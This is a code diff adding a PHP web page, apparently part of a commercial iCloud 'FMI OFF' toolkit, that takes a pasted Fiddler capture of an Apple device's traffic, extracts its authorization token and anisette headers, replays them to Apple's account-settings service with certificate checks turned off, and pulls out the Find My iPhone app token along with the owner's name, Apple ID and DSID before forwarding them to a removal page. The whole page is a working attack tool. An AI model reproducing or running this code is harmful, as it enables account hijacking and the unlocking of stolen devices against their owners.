@@ -1,0 +1,284 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="js/common.js" type="application/javascript"></script>
+    <link href="css/common.css" rel="stylesheet">
+	<!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>iCloud OFF ：+84932209990</title>
+	<!-- Add icon library -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <style>
+        .error{
+            color:red;
+        }
+        input[type='text']{
+            width:60%;
+            padding:10px;
+        }
+        #check2{
+            background-color: #4CAF50; /* Green */
+            border: none;
+            color: white;
+            padding: 9px 13px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+        }
+		#check3{
+            background-color: #4CAF50; /* Green */
+            border: none;
+            color: white;
+            padding: 9px 13px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+        }
+		 #passcode{
+            background-color: yellow; /* Green */
+            border: none;
+            color: black;
+            padding: 9px 13px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+        }
+        #clear{
+            background-color: red; /* Green */
+            border: none;
+            color: white;
+            padding: 9px 13px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+        }
+		#btn {
+			background-color: DodgerBlue;
+			border: none;
+			color: white;
+			padding: 12px 16px;
+			font-size: 16px;
+			cursor: pointer;
+		}
+
+/* Darker background on mouse-over */
+.btn:hover {
+  background-color: RoyalBlue;
+}
+
+/* Navbar container */
+.navbar {
+  overflow: hidden;
+  background-color: #333;
+  font-family: Arial;
+}
+
+/* Links inside the navbar */
+.navbar a {
+  float: left;
+  font-size: 16px;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+/* The dropdown container */
+.dropdown {
+  float: left;
+  overflow: hidden;
+}
+
+/* Dropdown button */
+.dropdown .dropbtn {
+  font-size: 16px;
+  border: none;
+  outline: none;
+  color: white;
+  padding: 14px 16px;
+  background-color: inherit;
+  font-family: inherit; /* Important for vertical align on mobile phones */
+  margin: 0; /* Important for vertical align on mobile phones */
+}
+
+/* Add a red background color to navbar links on hover */
+.navbar a:hover, .dropdown:hover .dropbtn {
+  background-color: red;
+}
+
+/* Dropdown content (hidden by default) */
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: #f9f9f9;
+  min-width: 160px;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  z-index: 1;
+}
+
+/* Links inside the dropdown */
+.dropdown-content a {
+  float: none;
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+  text-align: left;
+}
+
+/* Add a grey background color to dropdown links on hover */
+.dropdown-content a:hover {
+  background-color: #ddd;
+}
+
+/* Show the dropdown menu on hover */
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+</style>
+</head>
+<div class="navbar">
+  <a href="index.php">Home</a>
+  <div class="dropdown">
+    <button class="dropbtn">More
+      <i class="fa fa-caret-down"></i>
+    </button>
+    <div class="dropdown-content">
+	  <a href="proxy.php">Proxy </a>
+      <a href="PasstokenMac.php">Token Mac</a>
+      <a href="Passtokenwin.php">Token Win</a>
+	  <a href="litetoken.php">FMI Lite</a>
+	  <a href="proxytoken.php">Proxy Manual</a>
+	  <a href="proxyraw.php">Proxy Raw</a>
+	  <a href="passtoken.php">Token Manual</a>
+	  
+	  </div>
+  </div>
+</div>
+    </style>
+</head>
+<body style="background-color:#E085D1">
+
+<p style="text-align: center"><h1 ><b> Proxy FMI RAW</b></h1><br> </p>
+<center><div id="loader"></div></center>
+<form method="post">
+
+    <label>DATA-OFF-FMI &nbsp&nbsp&nbsp&nbsp&nbsp  </label><input style="height:15px" type="text" class="form-control" name="FD1" placeholder="Fiddler --- Raw --- Copy All --- Here" style="background-color:#fff;" class="validate"><br>
+    <span id="appToken_error" class="error"></span>
+   <br>
+    <input type="submit" class="btn" id="check2"  name="submit" value="SUBMIT" >&nbsp;
+	<input type="reset" id="clear" value="CLEAR" onclick="document.theForm.reset();return false;">
+    <br>
+    </br>
+	</form>
+</script>
+
+ <br />
+        <br />
+        <div align="center" class="text-center">
+		
+		
+        <?php
+            ini_set("error_reporting","E_ALL & ~E_NOTICE");   
+            $submit = empty($_POST['submit']) ? null : $_POST['submit'];
+
+            if ( isset($submit) )
+            {
+                $FD=$_POST["FD1"];
+                
+                
+                $tokenstart=strpos($FD,'Authorization: ',0);
+                $MDMstart=strpos($FD,'X-Apple-I-MD-M: ',0);
+                $MDstart=strpos($FD,'X-Apple-I-MD: ',0);
+                
+                $basic=substr($FD,$tokenstart+15,$length+294);
+                $mdm=substr($FD,$MDMstart+16,$length+80);
+                $md=substr($FD,$MDstart+14,$length+40);
+                
+                
+                require_once 'PlistParser.php';
+
+                $curl = curl_init();
+                curl_setopt_array($curl, array(
+                CURLOPT_URL => "https://setup.icloud.com/setup/get_account_settings",
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_ENCODING => "",
+                CURLOPT_MAXREDIRS => 10,
+                CURLOPT_TIMEOUT => 0,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+                CURLOPT_CUSTOMREQUEST => "GET",
+                CURLOPT_HTTPHEADER => array(
+                    "Content-Type: application/json",
+                    "X-MMe-Client-Info: <iPhone9,3> <iPhone OS;13.3.1;17D50> <com.apple.AppleAccount/1.0 (com.apple.Preferences/181.1)>",
+                    "X-Apple-Find-API-Ver: 2.0",
+                    "Connection: keep-alive",
+                    "X-Apple-OAuth-Client-Type: firstPartyAuth",
+                    "X-Apple-AuthScheme: Forever",
+                    "X-Apple-Realm-Support: 1.0",
+                    "X-Apple-I-MD: ".$md,
+                    "X-Apple-I-MD-M: ".$mdm,
+                    "Accept: */*",
+                    "Authorization:  ".$basic
+                ),
+                ));
+
+                $response = curl_exec($curl);
+
+                curl_close($curl);
+
+                if ( !stristr($response, 'UNAUTHORIZED') )
+                {
+                    include_once "class/deviceClass.php";
+
+                    file_put_contents('info.plist', $response);
+                    $plistParser = new PlistParser;
+                    $result = $plistParser->plistToArray("info.plist");
+
+                    $token = base64_encode($result['appleAccountInfo']['dsPrsID'].':'.$result['tokens']['mmeFMIPAppToken']);
+
+                    //$deviceObj = new deviceClass($token, $md, $mdm);
+
+                    //var_dump($result);
+
+                    echo 'Fullname: '. $result['appleAccountInfo']['fullName'].'<br />';
+                    echo 'Apple ID: '. $result['appleAccountInfo']['appleId'].'<br />';
+                    echo 'DSID: '. $result['appleAccountInfo']['dsPrsID'].'<br /><br />';
+					//echo $token = $token ;
+					//echo $md = $md ;
+					//echo $mdm = $mdm ;
+                    //echo '<textarea rows="5" class="form-control" style="width: 100%">'.$deviceObj->removeDeviceAll().'</textarea><br /><br />';
+
+                    //echo "<h2>".$deviceObj->start()."</h2>";
+                    //echo "<h2>".$deviceObj->removeDeviceAll()."</h2>";
+                }
+                else {
+                    echo 'UNAUTHORIZED! wrong token or MD is expired';
+                }
+            }
+        ?>
+  	</div>
+
+ <form method="post" id="form2" action="passtoken.php">
+ <input type="hidden" name="token1" value="<?php echo $token ?>">
+ <input type="hidden" name="md1" value="<?php echo $md; ?>">
+ <input type="hidden" name="mdm1" value="<?php echo $mdm; ?>">
+ <button type="submit" name="submit2" id="passcode" i class="fa fa-apple">&nbspGO TO OFF--->></button>
+</form>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+  </body>
+</html>
